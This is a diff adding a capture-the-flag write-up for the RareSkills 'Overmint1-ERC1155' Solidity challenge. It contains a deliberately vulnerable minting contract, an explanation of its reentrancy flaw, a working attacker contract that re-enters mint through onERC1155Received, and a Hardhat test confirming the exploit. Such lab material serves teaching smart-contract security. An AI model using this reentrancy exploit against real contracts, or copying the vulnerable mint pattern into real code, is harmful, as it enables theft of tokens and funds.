@@ -335,3 +335,129 @@ contract ExploitContract {
     receive() external payable {} 
 }
 ```
+
+## RareSkills Riddles - Overmint1-ERC1155
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
+import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
+
+contract Overmint1_ERC1155 is ERC1155 {
+    using Address for address;
+    mapping(address => mapping(uint256 => uint256)) public amountMinted;
+    mapping(uint256 => uint256) public totalSupply;
+
+    constructor() ERC1155("Overmint1_ERC1155") {}
+
+    function mint(uint256 id, bytes calldata data) external {
+        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
+        totalSupply[id]++;
+        _mint(msg.sender, id, 1, data);
+        amountMinted[msg.sender][id]++;
+    }
+
+    function success(address _attacker, uint256 id) external view returns (bool) {
+        return balanceOf(_attacker, id) == 5;
+    }
+}
+```
+
+### Exploit
+
+The `mint` function doesn't follow the checks-effects-interactions pattern and is, therefore, vulnerable to reentrancy. To see this, note that the ERC1155 `_mint` function calls `_doSafeTransferAcceptanceCheck` under the hood, which in turn calls `onERC1155Received` on the receiving contract. This hands over control to the receiving contract before `amountMinted` is updated.
+
+Therefore, we can solve this challenge using a custom `onERC1155Received` function that reenters `mint` until our attacker contract has a balance of 5 tokens of a given `id`. 
+
+_Overmint1_ERC1155_Attacker.sol_
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+
+import "hardhat/console.sol";
+import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
+import "./Overmint1-ERC1155.sol";
+
+contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
+    Overmint1_ERC1155 public overmint1ERC1155;
+
+    constructor(address _victim) {
+        overmint1ERC1155 = Overmint1_ERC1155(_victim);
+    }
+
+    // Fallback function can be used to start the attack
+    function attack() public {
+        overmint1ERC1155.mint(0, "");
+        overmint1ERC1155.safeTransferFrom(address(this), msg.sender, 0, 5, "");
+    }
+
+    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
+        external
+        override
+        returns (bytes4)
+    {
+        if (overmint1ERC1155.balanceOf(address(this), 0) < 5) {
+            overmint1ERC1155.mint(0, "");
+        }
+        return this.onERC1155Received.selector;
+    }
+
+    function onERC1155BatchReceived(
+        address operator,
+        address from,
+        uint256[] calldata ids,
+        uint256[] calldata values,
+        bytes calldata data
+    ) external pure override returns (bytes4) {
+        return this.onERC1155BatchReceived.selector;
+    }
+
+    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
+        return interfaceId == type(IERC1155Receiver).interfaceId;
+    }
+}
+```
+
+_Overmint1-ERC1155.js_
+```javascript
+const {
+    loadFixture,
+} = require("@nomicfoundation/hardhat-network-helpers");
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+const NAME = "Overmint1_ERC1155";
+
+describe(NAME, function () {
+    async function setup() {
+        const [owner, attackerWallet] = await ethers.getSigners();
+
+        const VictimFactory = await ethers.getContractFactory(NAME);
+        const victimContract = await VictimFactory.deploy();
+
+        return { victimContract, attackerWallet };
+    }
+
+    describe("exploit", async function () {
+        let victimContract, attackerWallet;
+        before(async function () {
+            ({ victimContract, attackerWallet } = await loadFixture(setup));
+        })
+
+        it("conduct your attack here", async function () {
+            const AttackerFactory = await ethers.getContractFactory("Overmint1_ERC1155_Attacker");
+            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
+            await attackerContract.connect(attackerWallet).attack();
+        });
+
+        after(async function () {
+            expect(await victimContract.balanceOf(attackerWallet.address, 0)).to.be.equal(5);
+            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(3, "must exploit in two transactions or less");
+        });
+    });
+});
+```
